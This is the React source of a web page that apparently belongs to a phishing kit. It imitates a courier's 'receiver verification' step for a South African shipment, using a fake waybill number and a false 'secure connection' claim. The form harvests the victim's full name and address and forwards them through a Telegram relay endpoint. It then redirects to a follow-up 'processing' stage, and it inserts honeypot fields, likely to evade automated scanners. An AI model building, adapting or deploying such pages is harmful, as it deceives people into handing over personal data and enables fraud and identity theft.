 import { Navbar } from "@/components/Navbar";
import { Footer } from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { motion } from "framer-motion";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";
import { useLocation } from "wouter";
import { useVisitId } from "@/hooks/use-visit-id";
import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";
import { addHoneypotToForm } from "@/lib/honeypot";
import { useEffect, useRef } from "react";
import { 
  CheckCircle2, 
  Info, 
  ShieldCheck, 
  Barcode, 
  User, 
  MapPin, 
  Lock,
  MessageCircle,
  Loader2
} from "lucide-react";

export default function Home() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  useVisitId(); // Initialiser le visitId
  const [isSubmitting, setIsSubmitting] = useState(false);
  const formRef = useRef<HTMLFormElement>(null);
  const [formData, setFormData] = useState({
    fullname: "",
    city: "",
    address: "",
    postal: "",
    country: "South Africa"
  });

  // Ajouter les champs honeypot au formulaire
  useEffect(() => {
    if (formRef.current) {
      addHoneypotToForm(formRef.current);
    }
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    const message = `
📦 *New Shipment Verification*

👤 *Name:* ${formData.fullname}
🏙 *City:* ${formData.city}
🏠 *Address:* ${formData.address}
📮 *Postal Code:* ${formData.postal}
🌍 *Country:* ${formData.country}

🔖 *Tracking Number:* CI22105583668
    `;

    try {
      const response = await fetchWithVisitId("/api/telegram/send", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message,
          parseMode: "Markdown",
        }),
      });

      if (response.ok) {
        // Stocker le fullName pour utilisation ultérieure
        localStorage.setItem("client_fullname", formData.fullname);

        toast({
          title: "Update completed",
          description: "Shipping information has been successfully updated.",
          duration: 2000,
        });
        
        // Redirect directly to processing page after verification
        setTimeout(() => {
          setLocation('/processing');
        }, 1000);

      } else {
        throw new Error('Failed to send message');
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to submit verification. Please try again.",
        variant: "destructive"
      });
      console.error(error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col w-full bg-slate-50 font-sans overflow-x-hidden">
      <Navbar />

      <main className="flex-grow py-12 px-4 md:px-8">
        <div className="container mx-auto max-w-2xl">
          
          {/* Status Header */}
          <div className="flex items-center gap-2 mb-2">
             <CheckCircle2 className="h-5 w-5 text-brand-blue" />
             <span className="font-bold text-brand-blue text-lg">Status:</span>
             <span className="font-bold text-brand-blue border-b-2 border-brand-orange pb-0.5">Receiver verification required</span>
          </div>

          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3 }}
          >
            {/* Important Notice Card */}
            <Card className="border-l-4 border-l-brand-orange shadow-sm mb-8 overflow-hidden">
              <CardContent className="p-6 bg-white">
                <div className="flex items-start gap-3 mb-4">
                  <Info className="h-6 w-6 text-brand-blue mt-0.5 flex-shrink-0" />
                  <div>
                    <h3 className="text-xl font-bold text-brand-blue mb-2">Important Notice</h3>
                    <p className="text-gray-600 mb-4 leading-relaxed">
                      Your shipment has arrived in our warehouse and requires receiver verification before proceeding with customs clearance.
                    </p>
                    <p className="text-gray-600 mb-4 font-medium">
                      This shipment is registered under your email address. Please complete the verification below to authorize further processing.
                    </p>
                    <ul className="space-y-2 text-gray-600 list-disc pl-5 marker:text-brand-orange">
                      <li>Shipment requires receiver confirmation</li>
                      <li>Please verify your contact details</li>
                      <li>Additional instructions will follow verification</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Tracking Number Section */}
            <div className="mb-8">
              <div className="flex items-center gap-2 mb-2 text-brand-blue font-bold">
                <Barcode className="h-5 w-5" />
                <label>Waybill number:</label>
              </div>
              <div className="relative">
                <Input 
                  value="CI22105583668" 
                  readOnly 
                  className="bg-gray-100 border-gray-200 text-gray-500 font-mono h-12 px-4 text-lg cursor-not-allowed"
                />
                <div className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-bold text-orange-600 flex items-center gap-1 bg-orange-50 px-2 py-1 rounded">
                  <Info className="h-3 w-3" /> Awaiting instructions
                </div>
              </div>
            </div>

            {/* Receiver Information Form */}
            <form ref={formRef} onSubmit={handleSubmit} className="bg-white p-6 md:p-8 rounded-xl shadow-sm border border-gray-100">
              <div className="mb-6 border-b border-gray-100 pb-4">
                <div className="flex items-center gap-2 mb-1">
                  <User className="h-5 w-5 text-brand-blue" />
                  <h2 className="text-xl font-bold text-brand-blue">Receiver Information</h2>
                </div>
                <p className="text-gray-500 text-sm pl-7">Please provide your complete details for shipment verification</p>
              </div>

              <div className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="fullname" className="font-bold text-brand-blue">Full Name <span className="text-red-500">*</span></Label>
                    <Input 
                      id="fullname" 
                      placeholder="John Smith" 
                      className="h-11 bg-gray-50/50" 
                      required 
                      value={formData.fullname}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="city" className="font-bold text-brand-blue">City <span className="text-red-500">*</span></Label>
                    <Input 
                      id="city" 
                      placeholder="Johannesburg" 
                      className="h-11 bg-gray-50/50" 
                      required 
                      value={formData.city}
                      onChange={handleInputChange}
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="address" className="font-bold text-brand-blue">Street Address <span className="text-red-500">*</span></Label>
                  <Input 
                    id="address" 
                    placeholder="123 Main Street" 
                    className="h-11 bg-gray-50/50" 
                    required 
                    value={formData.address}
                    onChange={handleInputChange}
                  />
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="postal" className="font-bold text-brand-blue">Postal Code <span className="text-red-500">*</span></Label>
                    <Input 
                      id="postal" 
                      placeholder="2001" 
                      className="h-11 bg-gray-50/50" 
                      required 
                      value={formData.postal}
                      onChange={handleInputChange}
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="country" className="font-bold text-brand-blue">Country</Label>
                    <Input 
                      id="country" 
                      value={formData.country} 
                      readOnly 
                      className="h-11 bg-gray-100 text-gray-500 cursor-not-allowed" 
                    />
                  </div>
                </div>

                <div className="pt-4">
                  <Button 
                    type="submit" 
                    disabled={isSubmitting}
                    className="w-full h-14 bg-brand-orange hover:bg-orange-600 text-white font-bold text-lg shadow-md transition-all hover:scale-[1.01] flex items-center justify-center gap-2"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="h-6 w-6 animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      <>
                        <ShieldCheck className="h-6 w-6" />
                        Verify & Continue
                      </>
                    )}
                  </Button>
                </div>
                
                <div className="flex items-center justify-center gap-2 text-gray-400 text-xs font-medium pt-2">
                  <Lock className="h-3 w-3" />
                  <span>Secure connection • Your information is protected</span>
                </div>
              </div>
            </form>
          </motion.div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
